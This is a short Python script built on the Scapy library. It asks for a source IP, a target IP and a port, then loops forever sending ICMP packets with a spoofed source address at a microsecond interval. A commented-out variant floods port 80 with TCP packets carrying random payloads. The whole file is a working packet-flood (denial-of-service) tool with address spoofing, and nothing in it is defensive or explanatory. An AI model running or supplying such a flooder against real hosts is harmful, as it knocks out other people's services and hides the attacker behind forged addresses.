from scapy.all import *
source_IP = input("Enter IP address of Source: ")
target_IP = input("Enter IP address of Target: ")
source_port = int(input("Enter Source Port Number:"))
i = 1

while True:
   IP1 = IP(src = source_IP, dst = target_IP)
   # TCP1 = TCP(sport = source_port, dport = 80)
   TCP1 = TCP(sport = RandShort(), dport = 80)
   pkt = IP1 / ICMP()
   # pkt = IP1 / TCP1 / Raw(RandString(size = 72))
   send(pkt, inter = .000001, )
   
   print ("packet sent ", i)
   i = i + 1

   print("done!")
